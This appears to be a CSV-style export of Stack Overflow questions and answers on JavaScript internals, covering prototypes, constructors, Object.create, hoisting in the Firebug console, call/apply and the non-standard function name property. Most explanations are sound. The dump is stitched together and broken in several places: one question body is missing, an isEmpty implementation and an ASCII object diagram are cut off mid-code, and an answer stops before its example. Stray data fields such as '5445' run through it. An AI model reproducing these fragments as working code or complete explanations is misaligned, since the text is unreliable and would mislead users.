<p>The Firebug console, executes its code wrapping it inside a <code>try-catch</code> block, that's why the function is not available <em>before</em> its declaration.</p>

<p>If you try on the console:</p>

<pre><code>console.log(typeof f); // ""undefined""
function f () {}
</code></pre>

<p>You will see that <code>f</code> isn't prepared yet, but if you wrap your code inside a function, you will see the expected behavior:</p>

<pre><code>(function () {
  console.log(typeof f); // ""function""
  function f () {}
})();
</code></pre>

<p>Again, that's because now <code>f</code> is defined as a Function Declaration, since it exist in the body of the anonymous function, and is not part of an statement Block.</p>
"
"<p>Consider the following code:</p>

<pre><code>var f = function() { return 10; }
typeof f;                         // returns ""function""
f();                              // returns 10

var g = f;
g();                              // returns 10, obviously

var h = new f;
h;                                // console evaluates to f - ????
h();                              // Type error - called_non_callable
typeof h;                         // returns ""object""
</code></pre>

<p>So, what is h here?  The Chrome console seems to evaluate it as f, but it isn't callable.  What does it mean to ""new"" a function like this?  How is h now related to f?</p>

<p>As an aside, these two lines appear to be equivalent:</p>

<pre><code>var h = new f;
var h = new f();
</code></pre>

<p>What's up with that?</p>
","5445","","<p>The root of your confusion is the way that Chrome represents objects on its console. </p>

<p>The expression <code>new f()</code> in your example is represented as '<code>f</code>' on the Chrome's console output, but just as a mere ""convenience"" of this particular console, for example, logging the following object:</p>

<pre><code>({constructor: function Foo(){}});
</code></pre>

<p>Will show it represented as ""<code>Foo</code>"". Basically the console tries to find a <em>representation</em> of which constructor your object is <em>instance of</em>.</p>

<p>So, the console shows you <code>f</code>, but you are not logging the function, the <code>new</code> operator produces an object that inherits from <code>f.prototype</code>.</p>

<p>You are returning <code>10</code> from the function, but since you call it with <code>new</code>, and the return type is a <em>primitive</em>, the value is discarded, the newly created object that inherits form <code>f.prototype</code> is returned.</p>

<p>For example:</p>

<pre><code>var F = function () { return 10; };
F.prototype.inherited = 'foo';

var h = new F(); // the 10 returned is ignored
h instanceof F; // true
h.inherited;    // ""foo""
</code></pre>

<p>On the other hand, if you return an object from a constructor, the object instance that the <code>new</code> operator creates behind the scened (and inherits from the constructor's prototype) will be lost, for example:</p>

<pre><code>var F = function () { return  {}; };
F.prototype.inherited = 'foo';

var h = new F(); // the empty object is returned
h instanceof F; // false
h.inherited;    // undefined
</code></pre>

<p>Yes, <code>new f;</code> and <code>new f();</code> are completely equivalent, although people recommend using the parentheses to add clarity to your code.</p>
"
"<pre><code>var zero = 0;
zero.toString();   // '0' --&gt; fine
0.toString();      // syntax error!
0..toString();     // '0' --&gt; fine
</code></pre>

<p>My conclusion: calling <code>x.toString()</code> doesn't only depend on the value of <code>x</code>, but also on the way <code>x</code> is <em>presented</em>.</p>

<p>Are there other such examples in JavaScript where I might get an unexpected syntax error due to presentation?</p>
","5445","","<p>Well, there are other cases where the <em>context</em> of where symbols appear affects how they behave, for example, statement Block's vs Object Literals:</p>

<pre><code>{}          // empty block
var o = {}; // empty object
({});       // empty object
0,{}        // empty object

{ foo: 'bar'} // block, `foo` label, 'bar' ExpressionStatement
var o = { foo: 'bar'}; // object literal, declaring a `foo` property
                       // whose value is 'bar'
</code></pre>

<p>They look exactly the same, but blocks are evaluates in ""statement context"", object literals are evaluated in <em>expression context</em>.</p>

<p>Also, Function Declarations vs. Function Statements, e.g.:</p>

<pre><code>function foo() {}.length;   // SyntaxError, `foo` is a function declaration
0,function foo() {}.length; // 0, `foo` is a function expression
(function foo {}).length;   // 0
</code></pre>

<p>The example you post, relates to the way the grammar of Numeric literals are defined, the decimal part after the dot is actually optional, for example:</p>

<pre><code>var n = 0.;
</code></pre>

<p>Is a valid Numeric literal, that's why, accessing <code>0.toString</code> gives you a <code>SyntaxError</code>, the interpreter would expect the decimal part, instead the <code>s</code> character.</p>

"<p>Since the ECMA-262 specifications Javascript has gained the <em>Object.freeze()</em> method, which allows for objects, whose properties can not be changed, added or removed.</p>

<pre><code>var obj = {'a':1, 'b:2'};
Object.freeze(obj);
Object.isFrozen(obj);       // returns true
obj.a = 10;                 // new assignment has no affect
obj.a;                      // returns 1
</code></pre>

<p>So far so good.</p>

<p>I am wondering, whether freeze() should also work on Arrays.</p>

<pre><code>var arr = [1, 2];
Object.freeze(arr);
Object.isFrozen(arr);      // returns true
arr[0] = 10;
arr;                       // returns [10, 2] ... ouch!
</code></pre>

<p>Maybe I am wrong, but I was under the impression, that Array inherits from Object.</p>

<pre><code>typeof obj                 // ""object""
typeof arr                 // ""object""
</code></pre>

<p>Any ideas, pointers, enlightenments would be highly appreciated.</p>
","5445","","<p>Yes, freeze should work for Arrays, the behavior you are experiencing is clearly an implementation bug.</p>

<p>This bug might be related to the fact that array objects implement a custom <a href=""http://es5.github.com/#x15.4.5.1""><code>[[DefineOwnProperty]]</code></a> internal method (the magic that makes the <code>length</code> property work).</p>

<p>I just tested it on two implementations and it works properly (Chrome 16.0.888, and Firefox Aurora 8.02a).</p>

<p>About your second question, well, array objects inherit from <code>Array.prototype</code> which inherits from <code>Object.prototype</code>, for example, you can access non shadowed methods from <code>Object.prototype</code> directly on array objects:</p>

<pre><code>['a'].hasOwnProperty('0'); // true
</code></pre>

<p>But this isn't related about how the <code>typeof</code> works, this operator will return <code>'object'</code> for any object intance, regardless its kind, and for the <code>null</code> value, which people has always complained about.</p>

<p>The rest of possible return values of the <code>typeof</code> operator, correspond to the primitive types of the language, Number, String, Boolean and Undefined.</p>
"
"<p>Given these four examples of defining an object and then attempting to immediately access their properties:</p>

<pre><code>{foo: 'bar'}.foo
// syntax error: unexpected_token
</code></pre>

<p>I expected this would return the value of 'foo', but it results in a syntax error.</p>

<p>The only explanation I can come up with is that the object definition hasn't been executed and therefore is not yet an object. It seems that the object definition is therefore ignored and the syntax error comes from attempting to execute just:</p>

<pre><code>.foo
// results in the same syntax error: unexpected_token
</code></pre>

<p>Similarly:</p>

<pre><code>{foo: 'bar'}['foo']
// returns the new Array ['foo']
</code></pre>

<p>Which seems to be evidence that the object literal is ignored and the trailing code is executed.</p>

<p>These, however, work fine:</p>

<pre><code>({foo: 'bar'}).foo
// 'bar'

({foo: 'bar'})['foo']
// 'bar'
</code></pre>

<p>The parentheses are used to run the line of code and since the result of that parenthetical operator is the instantiated object, you can access properties.</p>

<p>So, why is the object definition ignored and not executed immediately?</p>
","5445","","<p>It's a matter of the ""context"", your first two examples are not object literals!</p>

<p>They are statement blocks, for example:</p>

<pre><code>{ foo: 'bar' }
</code></pre>

<p>The above code is evaluated as a block, containing a <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Statements#label_Statement"" rel=""nofollow"">labelled statement</a> (<code>foo</code>) that points to an <em>expression statement</em> (the string literal <code>'bar'</code>).</p>

<p>When you wrap it on parentheses, the code is evaluated in <em>expression context</em>, so the grammar matches with the Object Literal syntax.</p>

<p>In fact there are other ways to force the expression evaluation, and you will see that the <em>dot</em> property accesor notation works when applied directly to an object literal e.g.:</p>

<pre><code>({foo:'bar'}.foo);  // 'bar'
0, {foo:'bar'}.foo; // 'bar'
0||{foo:'bar'}.foo; // 'bar'
1&amp;&amp;{foo:'bar'}.foo; // 'bar'
// etc...
</code></pre>

<p>Now in your second example:</p>

<pre><code>{foo: 'bar'}['foo']
</code></pre>

<p>What happens here is that the two statements are evaluated, first the block and then the expression statement that contains the Array literal.</p>

<p>Is a syntax ambiguity similar to what happens with function expressions vs function declarations.</p>

"<p>I wasn't sure how to ask this, and I apologize if it's been asked already, but I could not find it or an answer.</p>

<p>What is returned when you assign a function to a var.</p>

<pre><code>    var obj = function(){
        this.name = 'Steve';
    }
    alert( obj.name === '');//true
    obj.name = 'Mike';
    alert( obj.name === '');//true
    obj.foo = 'fall';
    alert( obj.foo );//fall
</code></pre>

<p>I know <code>obj</code> is now a function/object and I can call <code>obj()</code>. I also know that the function attached to <code>obj</code> is a constructor for new objects of type <code>obj</code>. If I do</p>

<pre><code>var newObj = new obj();
alert( newObj.name );//Steve
</code></pre>

<p>""Steve"" is printed. etc. etc.</p>

<p>Why does obj seem to have a property called ""name"" attached to it? And why when I try to assign a value to that property does it not get assigned?</p>
","5445","","<p>Because function objects have a<code>name</code> property (which is non-standard by the way) that represents the ""name"" of the function, your function shows an empty string (<code>""""</code>) as the value of this property because it's anonymous.</p>

<p>For example, if you declare a function with the name <code>foo</code>:</p>

<pre><code>function foo() {}
foo.name; // ""foo""


var anon = function () {};
anon.name; // """", an anonymous function

var namedFunctionExpr = function bar () {};
namedFunctionExpr.name; // ""bar""
</code></pre>

<p>Also as you noted, you can't change the value of this property, since in most implementations, it's non-configurable, non-enumerable and non-writable:</p>

<pre><code>Object.getOwnPropertyDescriptor(function x(){}, 'name'); 
/* logs:
{ 
  configurable: false,
  enumerable: false,
  value: ""x"",
  writable: false
}
*/
</code></pre>

<p>Remember, this property is <em>non-standard</em> and there are some implementations that don't support it (e.g. all IE JScript versions do not support it)</p>

<p>Now as @Felix suggest, I would like to add that <code>this.name</code> doesn't have anything to do with your function's <code>name</code> property.</p>

<p>In your example, calling the <code>obj</code> function as a constructor (with the <code>new</code> operator), sets the <code>this</code> value to a newly created object, that inherits from your function's prototype, and you are assigning a value to the <code>name</code> property to this new object.</p>
"
"<p>Using pure JavaScript to do inheritance, this is what I usually do:</p>

<pre><code>function A() {}
A.prototype.run = function () {};

function B() {}
B.prototype = new A;
B.prototype.constructor = B;
</code></pre>

<p>Since there is no arguments to pass into the constructor, new A has nothing to complain about. Now, I haven't figured out a good way to do inheritance if the constructor has arguments to pass. For example,</p>

<pre><code>function A(x, y) {}
A.prototype.run = function () {};

function B(x, y) {}
B.prototype = new A;
B.prototype.constructor = B;
</code></pre>

<p>I could pass some arbitrary values like:</p>

<pre><code>B.prototype = new A(null, null);
</code></pre>

<p>In some cases, I may need to validate x and y in the constructor of A. In some extreme cases, I need throw errors when checking x or y. Then, there is no way for B to inherit from A using new A.</p>

<p>Any suggestions? </p>

<p>Thanks!</p>
","5445","","<p>Well, if you want to make <code>B.prototype</code> an object that inherits from <code>A.prototype</code>, without executing the <code>A</code> constructor, to avoid all possible side-effects, you could use a dummy constructor to do it, for example:</p>

<pre><code>function tmp() {}
tmp.prototype = A.prototype;
B.prototype = new tmp();
B.prototype.constructor = B;
</code></pre>

<p>You could create a function to encapsulate the logic of the creation of this new object, e.g.:</p>

<pre><code>function inherit(o) {
  function F() {}; // Dummy constructor
  F.prototype = o; 
  return new F(); 
}

//...
B.prototype = inherit(A.prototype);
B.prototype.constructor = B;
</code></pre>

<p>If you target modern browsers, you could use the ECMAScript 5 <code>Object.create</code> method for the same purpose, e.g.:</p>

<pre><code>B.prototype = Object.create(A.prototype);
B.prototype.constructor = B;

"<p>Lately I'm trying to get the technical aspects of the prototype chain. Now I have a few questions about object instantiation.</p>

};

var fooInst = new Foo('test');

<p>Thanks in advance!</p>

<p><strong>Edit</strong></p>

<p>So I found, that (in Chrome) <code>Object.getPrototypeOf(fooInst) === Foo.prototype;</code> is <code>true</code>, but <code>Object.getPrototypeOf(fooInst) === Object.getPrototypeOf(Foo)</code> is <code>false</code>. Why that?</p>
","5445","","<p>Your first assumption:</p>

<pre><code>Foo.prototype === Function.prototype;
</code></pre>

<p>Is not right, I think you are mixing up the concept of the <code>[[Prototype]]</code> internal property that all objects have, and makes the ""link"" of the prototype chain, and the <code>prototype</code> property that function objects have.</p>

<p>The above comparison will produce <code>false</code> because the value of the <code>Foo.prototype</code> property is a new object, created at the time you created the <code>Foo</code> function.</p>

<p>This object is initialized whenever you create a function object, it inherits from <code>Object.prototype</code> and it has a property, named <code>constructor</code> that points back to the function (<code>Foo.prototype.constructor === Foo</code>), and it's used when you call your function as a constructor.</p>

<p>Now, if we talk about the <code>[[Prototype]]</code> internal property, you are right, the <code>[[Prototype]]</code> of your <code>Foo</code> function is <code>Function.prototype</code> in other words, <code>Foo</code> inherits from <code>Function.prototype</code>, e.g.:</p>

<pre><code>Object.getPrototypeOf(Foo) === Function.prototype; // true
Foo instanceof Function; // true
Foo.__proto__ === Function.prototype; // true
</code></pre>

<p>About <code>fooInst</code> this object was created in a <em>new expression</em>, when you used your <code>Foo</code> function as a constructor, this new object is produced, and it inherits from <code>Foo.prototype</code>, (its internal <code>[[Prototype]]</code> property points to <code>Foo.prototype</code>).</p>

<p>The purpose of the <code>delete</code> operator is to delete <em>object properties</em>.</p>

<p><strong>Edit</strong>:</p>

<p>As @SLacks noted in the question comments, the <code>delete</code> operator does work with identifiers from the Firebug's console, that's because the Firebug uses <code>eval</code> to execute the code you input in the console, and the variable environment bindings of identifiers instantiated in code executed by <code>eval</code>, are <em>mutable</em>, which means that they can be deleted, this was probably to allow the programmer to delete at runtime dynamically declared variables with eval, for example:</p>

<p>The Object-to-Primitive conversion is made through an abstract operation called <a href=""http://es5.github.com/#x9.1""><code>ToPrimitive</code></a>, this method will try to convert the object to a primitive value, using the internal <a href=""http://jscoercion.qfox.nl/""><code>[[PrimitiveValue]]</code></a> method.</p>

<p>This will try to ejecute the object's <code>valueOf</code> and <code>toString</code> methods, and it will take the value of the first that returns a primitive value.</p>

<p>In the case those two methods don't return a primitive, or they aren't callable, a <code>TypeError</code> is thrown, e.g.:</p>

<pre><code>1 == { toString:null } // TypeError!
</code></pre>

<p>The above statement will produce a <code>TypeError</code> because the default <code>Object.prototype.valueOf</code> method doesn't do anything more than actually the same object instance (<code>this</code>, not a primitive value) and we are setting an own <code>toString</code> property that's not a function.</p>

"<p>I've always assumed that the prototype of a function was shared among all the objects, in a sense by reference. So if you change the value of a property of the prototype, all objects that share that prototype have the values change for them as well.  So for instance below it seems that instead of the property bar being shared between all objects, it is copied.  Is this right?  Are the properties of the prototype of the constructor simply copied to all the class objects as they are created, or are they shared by linkage?</p>

<pre><code>function foo()
{
     this.bar = 1;
}
function derived() { }
derived.prototype = new foo()

object1 = new derived()
object2 = new derived()

object1.bar = 2;
//but notice if I had said here derived.prototype.bar = 3, object1.bar would still equal 2 but object2.bar would equal 3
alert(object2.bar) // this prints 1;
</code></pre>
","5445","","<p>When you assign <code>object1.bar = 2</code>, you are creating an <em>own property</em> on <code>object1</code>, this property exist only in that object instance, and it has nothing to do with its prototype.</p>

<p>This property on <code>object1</code> will <em>shadow</em> the value of the one existing on <code>derived.prototype</code>, this means that when you lookup <code>object1.bar</code>, it will find a value directly existing on that object.</p>

<p>On the other side, if you lookup <code>object2.bar</code>, this object doesn't have an own <code>bar</code> property, so the property lookup will search on the object this one inherits from (<code>derived.prototype</code>) and it will find the value <code>1</code>.</p>

<p>Your object structure looks something like this:</p>

<pre>
 object1
 --------
| bar: 2 | -----------------
 --------                   |         derived.prototype

<p>If you target IE8 and below you will need to implement something like this:</p>

<pre><code>var isEmpty = (function () {
    var hasOwn = Object.prototype.hasOwnProperty,
        hasDontEnumBug = !{toString:0}.propertyIsEnumerable(""toString""),
        dontEnums = ['toString', 'toLocaleString',
            'valueOf', 'hasOwnProperty',

            'constructor'];

                if (hasOwn.call(o, dontEnums[i]))

<p>Now in modern browsers that implement ECMAScript 5 as @Alnitak mentions you could use <code>Object.keys</code>, but in ES5 now we have the power of defining <em>non-enumerable properties</em>, these properties won't appear on the <code>for-in</code> loop, if you need to detect them, you have to use an alternate method, for example, using the above function, or <code>Object.keys</code>:</p>

<pre><code>var obj = Object.create(null, { foo: { value: 1, /* enumerable:false... */} });
isEmpty(obj); // true
Object.keys(obj).length; // 0

// But the property exists:
obj.hasOwnProperty('foo'); // true
obj.foo; // 1
</code></pre>

<p>We need another approach if you want to catch non-enumerable own properties, that's why the <code>Object.getOwnPropertyNames</code> method exist:</p>

<pre><code>function isEmpty(obj) {
  return Object.getOwnPropertyNames(obj).length == 0;
}

","5445","","<p>The piece of code by itself doesn't do anything, it's just dead code, a parentethized expression that uses the comma operator.</p>

<p>The comma operator will evaluate the first expression <code>'selectionchange'</code> and then the function expression, but with absolutely no effect, in fact, a Javascript engine that does optimization might not even evaluate these two expressions.</p>

"<p>I wanted to invoke a function using the javascript apply() method. This works fine if the function has no arguments. i.e.</p>

<pre><code>function test()
{
  console.log(this);
}

body = document.getElementsByTagName(""body"")[0]; // shortcut to body element

test.apply(body); // returns [object HTMLBodyElement]
</code></pre>

<p>But I can't seem to do the same thing to invoke a function that has arguments:</p>

<pre><code>function test(msg)
{
  console.log(msg);
}

body = document.getElementsByTagName(""body"")[0]; // shortcut to body element

test(this).apply(body); // mysteriously returns the correct result, then
// typeError: 'undefined' is not an object (evaluating ""test(this).apply"".
</code></pre>

<p>The examples above are completely trivial but the grain of my question is: How do I use the apply() method to invoke a function with arguments.</p>
","5445","","<p>First notice that you are actually invoking your function immediately, the line:</p>

<pre><code>test(this).apply(body);
</code></pre>

<p>Fails because at first, you call the <code>test</code> function passing <code>this</code> <em>as an argument</em>, and then you try to access an <code>apply</code> property on the function's result, which is <code>undefined</code> since your function doesn't return anything.</p>

<p>That property access on the <code>undefined</code> value is giving you the <code>TypeError</code> exception.</p>

<p>Now, let's see what you actually want to do, if you want to pass the value of the <code>body</code>  variable as the argument of your function, setting the outer <code>this</code> value, as the <code>this</code> value of <code>test</code>, you can do:</p>

<pre><code>test.apply(this, [body]);
</code></pre>

<p>But that's why the <code>call</code> method exists, when you know exactly which arguments to pass, you don't need to create an array for nothing, you just pass the arguments:</p>

<pre><code>test.call(this, body);
</code></pre>

<p>The <code>apply</code> method is really useful when you deal with for example a dynamic number of arguments, when you know which arguments want to pass, and still have the ability of setting the <code>this</code> value, <code>call</code> is just what you need.</p>
"
"<p>Here is an example:</p>

<pre><code>var Box = function() {
    this.id = generateUniqueId();
};
Box.prototype = {
    add:function(parent) {
        parent.appendChild(this.elm);
    }
};

var NewBox = function() {
    this.newThing = true;
};
NewBox.prototype = new Box();
NewBox.prototype.remove = function() {
    this.elm.parentNode.removeChild(this.elm);
};

var a = new NewBox();
var b = new NewBox();
alert(a.id); // alerts 0
alert(b.id); // also alerts 0! :@
</code></pre>

<p>I would like to have a and b (basically each time I create a <code>NewBox</code>) have their own <code>id</code>. I understand that <code>NewBox</code> is using prototypal inheritance and is thus inheriting from a single instance of the generated <code>id</code> that it gets from <code>Box</code>, but I would like it so that each <code>NewBox</code> gets its own <code>id</code> without having to explicitly say that inside the <code>NewBox</code> constructor.</p>

<p>Maybe it's impossible or I'm doing something really wrong, so please help!</p>

<p>Thanks a lot!</p>
","5445","","<p>In your example, the <code>Box</code> constructor gets executed only when you set the <code>NewBox.prototype</code> object.</p>

<p>You could workaround this by calling the <code>Box</code> constructor function inside <code>NewBox</code> with the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/apply"" rel=""nofollow""><code>Function.prototype.apply</code></a> method, to set the <code>this</code> value and forward all the argument values, for example:</p>

<pre><code>//..
var NewBox = function() {
    Box.apply(this, arguments);
    this.newThing = true;
};
//..

var a = new NewBox();
var b = new NewBox();

// assuming your `generateUniqueId` function
// increments a number

alert(a.id); // will alert 1
alert(b.id); // will alert 2
</code></pre>

<p>Now, each time the <code>NewBox</code> constructor is called to create a new object instance (<code>new NewBox();</code>), it will call the <code>Box</code> function to apply all its logic on it. This will help you to avoid repeating the logic of the parent constructor over and over. </p>

<p>The <code>apply</code>, is used call the ""parent"" constructor function setting the <code>this</code> value to the object instance that is being created by the <code>NewBox</code> constructor and we pass all arguments provided to this function.</p>

<p>Your example also shows a common problem, when you express inheritance relationship through <code>NewBox.prototype = new Box();</code> the <code>Box</code> constructor gets called and it has side effects, this new object will be initialized and your <code>generateUniqueId</code> function will be executed for the first time, if you want to avoid that, you need to either use a temp constructor, just to make a new object that inherits from <code>Box.prototype</code>, or use the new ECMAScript 5 <code>Object.create</code> method for the same purpose, for example:</p>

<pre><code>function inherit(o) {
  function Tmp() {}
  Tmp.prototype = o;
  return new Tmp();
}

//.....
NewBox.prototype = inherit(Box.prototype);
</code></pre>

<p>Or:</p>

<pre><code>NewBox.prototype = Object.create(Box.prototype);
</code></pre>

<p>In that way, you express the same inheritance hierarchy without running your <code>Box</code> constructor that first time, avoiding any side effect that it might cause.</p>

<p>At last but not least, whenever you replace a function's prototype property is always recommended to restore the <code>constructor</code> property of this new prototype object, otherwise it will point to the wrong function.</p>

<p>In your example, since you replace the <code>NewBox.prototype</code> with a new instance of <code>Box</code>, the <code>NewBox.prototype.constructor</code> property will point to <code>Box</code>, (your instances are affected, e.g. <code>a.constructor === Box; // true</code>) instead of to <code>NewBox</code> as you would expect, we need to set it back, e.g.:</p>

<pre><code>NewBox.prototype = someObject; // as any of the examples above
NewBox.prototype.constructor = NewBox;
</code></pre>

<p>You could abstract those details into a function, as I did in the <code>inherit</code> function above:</p>

<pre><code>function inherits(child, parent) {
  var obj, Tmp = function () {};
  Tmp.prototype = parent.prototype;
  obj = new Tmp();
  child.prototype = obj;
  child.prototype.constructor = child;
}

//...

// instead of setting the `NewBox.prototype` manually
inherits(NewBox, Box); // ""NewBox inherits from Box""

//...

<p>Hey guys~ I see this nice diagram and I do some test on my Chrome browser, I don't know how to explain this</p>

<pre><code>&gt; Function.prototype
  function Empty() {}
&gt; Function.__proto__
  function Empty() {}
&gt; typeof(Empty)
  ""undefined""
</code></pre>

<p>what is the <code>function Empty() {}</code>, and why <code>Function.prototype</code> is a <code>function</code> not a <code>object</code> just like <code>Object.prototype</code>?</p>

<p>From the diagram above, it seems everything in javascript start from <code>Object.prototype</code>, am I right about that?</p>
","5445","","<p>First, the <code>function Empty() {}</code> representation is <a href=""http://code.google.com/p/v8/"">V8</a> stuff.</p>

<p>In V8, the <code>Function.prototype</code> object has <code>""Empty</code>"" as the value of the <code>Function.prototype.name</code> property, so I guess you are probably using the Chrome's Developer Console, and it displays the name of the function in this way.</p>

<p>The <code>name</code> property of function objects is <code>non-standard</code> (not part of ECMA-262), that's why we see differences between implementations.</p>

<p>Now, <code>Function.prototype</code> is a function, that returns always <code>undefined</code> and can accept any number of arguments, but why?. Maybe just for consistency, every built-in constructor's prototype is like that, <code>Number.prototype</code> is a <code>Number</code> object, <code>Array.prototype</code> is an <code>Array</code> object, <code>RegExp.prototype</code> is a <code>RegExp</code> object, and so on...</p>

<p>The only difference (for example, between any function object and <code>Function.prototype</code>) is that obviously <code>Function.prototype</code> inherits from <code>Object.prototype</code>.</p>

<blockquote>
  <p>it seems everything in javascript start from Object.prototype, am I right about that?</p>
</blockquote>

<p>Well, you're right <code>Object.prototype</code> is the last object of the prototype chain of most objects, but in ECMAScript 5, you can even create objects that doesn't inherit from anything (just like <code>Object.prototype</code> is), and form another inheritance chain, e.g.:</p>

<pre><code>var parent = Object.create(null),
    child = Object.create(parent);

Object.getPrototypeOf(parent);           // null
Object.getPrototypeOf(Object.prototype); // null

};

<p>ty for any help in advance :)</p>
","5445","","<p>The <code>name</code> identifier of Function Expressions, is accessible only within the function itself.</p>

<p>In your jQuery example the <code>init</code> identifier isn't even used, so I think the only advantage to name the function it's just for debugging purposes, a debugger will be able to show you the function name in a long stack of calls.</p>

<p>Compare:</p>

<p><img src=""http://i.stack.imgur.com/AI8Tt.png"" alt=""anonymous functions on stack""></p>

<p>Vs.</p>

<p><img src=""http://i.stack.imgur.com/UHMH4.png"" alt=""named functions on stack""></p>

<p>Disadvantages exist, a long-standing bug on IE &lt;=8 makes named function expressions to leak the name identifier to its enclosing scope, moreover, creating two function objects, for example:</p>

<pre><code>var foo = function bar() {}; 

typeof bar; // ""function"" on IE
foo === bar; // false, two different objects
</code></pre>

<p>To avoid the side effects of this bug there are several workarounds, for example, to work inside an immediately called function, to create a function declaration within that scope, and return it, e.g.:</p>

<pre><code>jQuerySub.fn.init = (function () {
  function init( selector, context ) {
    //...

","5445","","<p>Every function has a <code>prototype</code> property, it's assigned when the function object is created, it points to a newly created object that inherits from <code>Object.prototype</code>, and it has a <code>constructor</code> property, that simply points back to the function itself.</p>

<p>The purpose of the <code>prototype</code> property is to give a way to implement inheritance, using constructor functions. When you call a function with the <code>new</code> operator, it will create a new object that inherits from that constructor's <code>prototype</code>.</p>

<p>Now, the purpose of the <code>constructor</code> property is to have a way to refer back to the constructor that has created an object, for example:</p>

<pre><code>function Foo () {}
// default value of the property:
Foo.prototype.constructor == Foo; // true
</code></pre>

<p>This property is inherited by the ""instances"" of <code>Foo</code>, so you can know which constructor was used to create an object:</p>

<pre><code>var foo = new Foo();
foo.constructor == Foo;
</code></pre>

<p>If you assign a new object to the function's prototype, this relationship is lost:</p>

<pre><code>function Bar () {}
Bar.prototype = { inherited: 1 };

Bar.prototype.constructor == Bar;    // false
Bar.prototype.constructor == Object; // true
</code></pre>

<p>And it affects also the instances of the function:</p>

<pre><code>var bar = new Bar();
bar.constructor == Bar;    // false
bar.constructor == Object; // true
</code></pre>

<p>Another similar case is when you have two or more levels of inheritance using constructors, the most common way is used to denote the inheritance relationship between the functions, is to assign the <code>prototype</code> property of the second level, e.g.:</p>

<pre><code>function Parent() {}

function Child () {}
Child.prototype = new Parent();
</code></pre>

<p>The above code has several problems, first, it executes the logic of the parent constructor to create the inheritance relationship, but that's another story, in the above example the <code>constructor</code> property is also affected, since we replace completely the <code>Child.prototype</code> object:</p>

<pre><code>var child = new Child();
child.constructor == Parent; // true
</code></pre>

<p>If we replace replace the value of the <code>constructor</code> property of <code>Child.prototype</code> after assigning it, it will show the expected behavior:</p>

<pre><code>function Child() {}
Child.prototype = new Parent();
Child.prototype.constructor = Child;

var child = new Child();
child.constructor == Child; // true
</code></pre>

"<p>Tell me if I'm wrong:</p>

<p>A prototype is a normal object. When an object inherits a prototype, it does not just copy the properties of the prototype, the object stores a reference to the prototype.</p>

","5445","","<blockquote>

<p>You're right, the prototype of an object, is just another object referenced through the prototype chain.</p>

<p>The difference between your two snippets is that with <code>__proto__</code> you are <strong>mutating</strong> the prototype of <code>food</code>. In your second example, you are just assigning a new object that inherits from <code>more_food</code>, that's why <code>food.fruit</code> is resolved to <code>undefined</code>, because your original <code>food</code> object is <em>lost by that assignment</em>.</p>

<blockquote>
  <p>What exactly is Object.create doing?</p>
</blockquote>

<p><code>Object.create</code> builds a <em>new object</em> that inherits from the object passed as its first argument (it can be only either an object or <code>null</code>).</p>

<blockquote>
  <p>Is the variable food assigned the reference to the prototype more_food, or is Object.create just returning a copy of the object more_food?</p>
</blockquote>

<p>Your <code>food</code> variable will hold a new object, which inherits from <code>more_food</code>, there's no any copying in this operation.</p>

<p>For example:</p>

<pre><code>var food = {fruit:""apple""};
var more_food = Object.create(food, {
  vegetable: { value: ""celery"" }
});

more_food.fruit;     // ""apple""
more_food.vegetable; // ""celery""
</code></pre>

<p>In the above example, <code>more_food</code> inherits from <code>food</code>, in other words, <code>food</code> is the prototype of <code>more_food</code>, this prototypical reference is stored in an internal property called <code>[[Prototype]]</code>. The second argument of <code>Object.create</code> allows you to initialize properties on this new object.</p>

<p>There's no copying, it's just plain <em>delegation</em> in the above example <code>more_food.fruit</code> is accesible through the prototype chain, the property lookup process is really simple, if a property is not found on an object, it's looked up again (delegation!) on the object's prototype, recursively, until an object whose prototype is <code>null</code> is found (like <code>Object.prototype</code>).</p>

<p>So, <code>more_food.fruit</code> is an inherited property:</p>

<pre><code>more_food.hasOwnProperty('fruit'); // false, inherited
'fruit' in more_food;              // true
</code></pre>

<p>While <code>vegetable</code> is an <em>own property</em> of <code>more_food</code>:</p>

<pre><code>more_food.hasOwnProperty('vegetable'); // true
</code></pre>

<p>The above example looks graphically like this:</p>

<pre>

  +---------------------+  [[Prototype]]  +---------------+
  | more_food           |+---------------&gt;| food          |
  |---------------------|                 |---------------|
  | vegetable: &quot;celery&quot; |                 | fruit: &quot;apple |
  +---------------------+                 +---------------+
</pre>

<blockquote>
  <p>If Object.create is just making a copy, then how does the prototype chain work if the variable food has no reference to more_food?</p>
</blockquote>

<p><code>Object.create</code> doesn't create copies of objects, it just sets up the prototype of a <em>new object</em> at the time of its creation.</p>

<p>Keep in mind that <code>__proto__</code> is a <em>non-standard</em> feature and it's going to be removed from implementations in the future, is already being listed as <em>deprecated</em> on the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/Proto"">Mozilla Documentation</a>, the main reason of this, and it's also why the language may never have a way to mutate the prototype chain in the way <code>__proto__</code> allows you is that it causes optimization and security problems, at the level of VM and JIT.</p>

"<p>I'm sure that this is an easy question for JS experts out there. Unfortunately for me I'm not one of them.</p>

<p>I've got the following situation. I'm creating an array in function b that I populate with some new objects. I then return that array back to function a (which called function b).</p>

<p>When I iterate through the returned array, the contents are all undefined. Off the cuff I figure that the JS garbage collector is probably involved here. How would I go about fixing this?</p>

<p>Sincerely,</p>

<p>mj</p>

<pre><code>function a()
{
    var x = b();

    for( var v in x ){
        //print out v.id and v.name
    }
}

function b()
{
    var y = new Array();
    var m = new Object();
    var n = new Object();
    m.id = 1;
    n.id = 2;
    m.name = ""alpha"";
    n.name = ""bravo"";

    y.push( m );
    y.push( n );

    return y;
}

","5445","","<p>The problem is how you are ""iterating"" through your array. You are using the <code>for-in</code> statement, and this statement should be used to <strong>enumerate</strong> object properties, not to <strong>iterate</strong> over arrays or array-like objects.</p>

<p>From your code:</p>

<pre><code>for( var v in x ){
    //print out v.id and v.name
}
</code></pre>

<p>The <code>for-in</code> statement in every iteration will feed <code>v</code> with <em>the name of each property</em>, since you are using an array in your example, <code>v</code> will be <code>'0'</code>, <code>'1'</code>, etc.</p>

<p>You could access <code>x[v]</code> but I really encourage you to use a sequential <code>for</code> loop, for example:</p>

<pre><code>for (var i = 0; i &lt; x.length; i++) {
  alert(x[i].id);
  alert(x[i].name);
}
</code></pre>

<p>There are many reasons why to avoid <code>for-in</code>, when your purpose is ""iterate"" over numeric indexes on array like objects, see the following questions for more information:</p>

"<p>I was looking at the source code to <a href=""http://craigsworks.com/projects/qtip2/"">qTip 2</a> and saw the following:</p>

<pre><code>// Munge the primitives - Paul Irish tip
var TRUE = true,
   FALSE = false,
    NULL = null;
